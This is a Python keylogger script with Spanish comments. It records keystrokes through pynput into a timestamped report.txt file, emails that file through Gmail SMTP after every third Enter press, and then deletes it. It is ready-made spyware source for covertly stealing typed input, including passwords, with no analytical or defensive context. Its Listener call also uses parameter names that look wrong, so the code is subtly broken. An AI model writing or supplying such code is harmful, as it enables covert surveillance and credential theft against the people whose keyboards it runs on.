import os
import sys
import datetime
import time
import pynput
from pynput.keyboard import Key, Listener
import smtplib
import keyboard

import smtplib, ssl
import getpass

from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def email():
    username = "@gmail.com" #gmail
    password = "" #contraseña 
    

    addressee = "@gmail.com"
    asunto="Report"
    message = MIMEMultipart("alternative")
    message["Subject"] = asunto
    message["From"] = username
    message["To"] = addressee
    
    html = f"""
    <html>
    <body>
        mensaje reporte <br>
    </body>
    </html>
    """
    parte_html= MIMEText(html, "html")
    message.attach(parte_html)
    file="report.txt"
    with open(file, "rb") as adjunto:
        content_adjunto = MIMEBase("application", "octet-stream")
        content_adjunto.set_payload(adjunto.read())
        encoders.encode_base64(content_adjunto)
        content_adjunto.add_header(
            "Content-Disposition",
            f"attachment; filename= {file}",
            )
        message.attach(content_adjunto)
        message_final = message.as_string()
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(username,password)
            print("SING IN!")
            server.sendmail(username, addressee, message_final)
            print("SEND")

count=0
keys=[]
active=0
arr=[]
def press(key):
    global keys,count,active,arr

    if key == Key.enter:
        for i in range(len(keys)):
            if active %2 !=0:
                keys[i] = str(keys[i]).upper()
            if keys[i] == "+":
                active+=1
        for i in range(len(keys)):
            if keys[i]=="+":
                pass
            else:
                arr.append(keys[i])

        keys=arr
        keys.append("\n")
        write(keys,count)
        keys=[]
        arr=[]
        count+=1
        if count>2:
            email()
            if os.path.exists("report.txt"):
                os.remove("report.txt")
            count=0

    elif key=='"':
        keys.append('"')
    elif key== Key.shift_r:
        keys.append("")
    elif key== Key.ctrl_l:
        keys.append("")
    elif key == Key.space:
        keys.append(" ")  
    elif key == Key.backspace:
        if len(keys)==0:
            pass
        else:
            keys.pop(-1)
    elif key == Key.caps_lock:
        keys.append("+")
    else:
        keys.append(key)
    print("{0}".format(key))
    
def write(keys,count):
    with open("report.txt", "a") as f:
        f.write(time.strftime("%d/%m/%y   "))
        f.write(time.strftime("%I:%M:%S   "))
        for key in keys:
            k=str(key).replace("'","")
            if k.find("\n")>0:
                f.write(k)
            elif k.find('Key')== -1:
                f.write(k)
            
        
def release(key):
    if key == Key.esc:
        return False
    
def main():
    if os.path.exists("report.txt"):
        os.remove("report.txt")
    else:  
        pass
    with Listener(press=press, release=release) as listener:
        listener.join()
    
if __name__== '__main__':
    main()

